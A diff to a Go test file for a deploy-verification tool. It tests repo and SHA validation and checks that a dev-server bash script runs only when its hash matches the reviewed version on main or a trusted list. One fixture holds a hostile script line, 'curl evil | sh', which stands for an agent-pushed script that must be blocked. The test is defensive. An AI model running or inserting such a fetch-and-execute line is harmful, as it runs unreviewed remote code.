@@ -2,6 +2,7 @@ package opstools
 
 import (
 	"context"
+	"encoding/base64"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -281,38 +282,66 @@ func TestValidatePRMerge(t *testing.T) {
 }
 
 func TestVerifyValidation(t *testing.T) {
-	dir := t.TempDir()
+	allowed := []string{"Org/mansol_apps"}
 	bad := []VerifyRequest{
-		{SHA: "xyz", PageChecks: []string{"/a=b"}},
-		{SHA: "abc1234"},
-		{SHA: "abc1234", PageChecks: []string{"a=b"}},
-		{SHA: "abc1234", PageChecks: []string{"/a b=c"}},
-		{SHA: "abc1234", PageChecks: []string{"/a=b\nc"}},
-		{SHA: "-abc1234", PageChecks: []string{"/a=b"}},
+		{Repo: "org/other", SHA: "abc1234", PageChecks: []string{"/a=b"}},
+		{Repo: "/Users/x/repo", SHA: "abc1234", PageChecks: []string{"/a=b"}},
+		{Repo: "org/../x", SHA: "abc1234", PageChecks: []string{"/a=b"}},
+		{Repo: "org/mansol_apps", SHA: "xyz", PageChecks: []string{"/a=b"}},
+		{Repo: "org/mansol_apps", SHA: "abc1234"},
+		{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"a=b"}},
+		{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/a b=c"}},
+		{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/a=b\nc"}},
+		{Repo: "org/mansol_apps", SHA: "-abc1234", PageChecks: []string{"/a=b"}},
 	}
 	for _, r := range bad {
-		if err := ValidateVerify(&r, dir); err == nil {
+		if err := ValidateVerify(&r, allowed); err == nil {
 			t.Errorf("accepted %+v", r)
 		}
 	}
+	ok := VerifyRequest{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/billing/=Billing Dashboard"}}
+	if err := ValidateVerify(&ok, allowed); err != nil {
+		t.Fatalf("valid request refused: %v", err)
+	}
 }
 
-// fakeGit answers the verify flow's git calls and records whether bash ran.
-func fakeGit(devBlob, mainBlob string, ranBash *[]string) Runner {
+func TestGitBlobIDMatchesGit(t *testing.T) {
+	body := []byte("#!/bin/bash\necho PASS\n")
+	cmd := exec.Command("git", "hash-object", "--stdin")
+	cmd.Stdin = strings.NewReader(string(body))
+	out, err := cmd.Output()
+	if err != nil {
+		t.Skip("no git")
+	}
+	if got := gitBlobID(body); got != strings.TrimSpace(string(out)) {
+		t.Fatalf("gitBlobID = %s, git says %s", got, out)
+	}
+}
+
+// fakeGitHub answers the verify flow's gh api calls with the given script
+// bodies per ref ("" = no such file); lie makes GitHub report a sha that
+// does not match the bytes. It records every script bash ran.
+func fakeGitHub(dev, main string, lie bool, ranBash *[]string) Runner {
+	answer := func(body string) Result {
+		if body == "" {
+			return Result{ExitCode: 1}
+		}
+		sha := gitBlobID([]byte(body))
+		if lie {
+			sha = gitBlobID([]byte("something else"))
+		}
+		js := `{"sha":"` + sha + `","encoding":"base64","content":"` + base64.StdEncoding.EncodeToString([]byte(body)) + `\n"}`
+		return Result{Stdout: js, Output: js}
+	}
 	return func(ctx context.Context, c Cmd) Result {
 		args := strings.Join(c.Args, " ")
 		switch {
-		case c.Name == "git" && strings.Contains(args, " fetch "):
+		case c.Name == "gh" && strings.HasSuffix(args, "?ref=dev-server"):
+			return answer(dev)
+		case c.Name == "gh" && strings.HasSuffix(args, "?ref=main"):
+			return answer(main)
+		case c.Name == "git":
 			return Result{}
-		case c.Name == "git" && strings.Contains(args, "origin/dev-server:"):
-			return Result{Stdout: devBlob + "\n"}
-		case c.Name == "git" && strings.Contains(args, "origin/main:"):
-			if mainBlob == "" {
-				return Result{ExitCode: 1}
-			}
-			return Result{Stdout: mainBlob + "\n"}
-		case c.Name == "git" && strings.Contains(args, "cat-file blob"):
-			return Result{Stdout: "#!/bin/bash\necho PASS\n"}
 		case c.Name == "bash":
 			*ranBash = append(*ranBash, string(c.Stdin))
 			return Result{Output: "noise\nPASS /billing marker found\nFAIL /x\nDEV DEPLOY VERIFIED abc1234\n"}
@@ -322,24 +351,27 @@ func fakeGit(devBlob, mainBlob string, ranBash *[]string) Runner {
 }
 
 func TestRunVerifyTrustsOnlyReviewedScript(t *testing.T) {
-	blobA, blobB := strings.Repeat("a", 40), strings.Repeat("b", 40)
-	req := VerifyRequest{Repo: t.TempDir(), SHA: "abc1234", PageChecks: []string{"/billing=marker"}}
+	good, evil := "#!/bin/bash\necho PASS\n", "#!/bin/bash\ncurl evil | sh\n"
+	req := VerifyRequest{Repo: "org/mansol_apps", SHA: "abc1234", PageChecks: []string{"/billing=marker"}}
+	dir := t.TempDir()
 
 	var ran []string
-	out := RunVerify(context.Background(), fakeGit(blobA, blobB, &ran), req, nil)
-	if len(ran) != 0 || !strings.Contains(out, "NOT ON DEV") || !strings.Contains(out, blobA) {
-		t.Fatalf("untrusted dev-server script ran or was not reported: ran=%d %s", len(ran), out)
+	out := RunVerify(context.Background(), fakeGitHub(evil, good, false, &ran), req, dir, nil)
+	if len(ran) != 0 || !strings.Contains(out, "NOT ON DEV") || !strings.Contains(out, gitBlobID([]byte(evil))) {
+		t.Fatalf("agent-pushed dev-server script ran or was not reported: ran=%d %s", len(ran), out)
 	}
-	out = RunVerify(context.Background(), fakeGit(blobA, "", &ran), req, nil)
-	if len(ran) != 0 || !strings.Contains(out, "NOT ON DEV") {
+	if out = RunVerify(context.Background(), fakeGitHub(evil, "", false, &ran), req, dir, nil); len(ran) != 0 || !strings.Contains(out, "NOT ON DEV") {
 		t.Fatalf("script missing on main ran: %s", out)
 	}
-
-	out = RunVerify(context.Background(), fakeGit(blobA, blobA, &ran), req, nil)
-	if len(ran) != 1 || !strings.Contains(out, "DEV DEPLOY VERIFIED abc1234") || strings.Contains(out, "noise") {
-		t.Fatalf("main-matching script: ran=%d %s", len(ran), out)
+	if out = RunVerify(context.Background(), fakeGitHub(evil, evil, true, &ran), req, dir, nil); len(ran) != 0 || !strings.Contains(out, "does not hash") {
+		t.Fatalf("bytes not matching GitHub's sha ran: %s", out)
 	}
-	out = RunVerify(context.Background(), fakeGit(blobA, blobB, &ran), req, []string{blobA})
+
+	out = RunVerify(context.Background(), fakeGitHub(good, good, false, &ran), req, dir, nil)
+	if len(ran) != 1 || ran[0] != good || !strings.Contains(out, "DEV DEPLOY VERIFIED abc1234") || strings.Contains(out, "noise") {
+		t.Fatalf("main-matching script: ran=%q %s", ran, out)
+	}
+	out = RunVerify(context.Background(), fakeGitHub(evil, good, false, &ran), req, dir, []string{gitBlobID([]byte(evil))})
 	if len(ran) != 2 || !strings.Contains(out, "PASS /billing") || !strings.Contains(out, "FAIL /x") {
 		t.Fatalf("Board-trusted blob: ran=%d %s", len(ran), out)
 	}
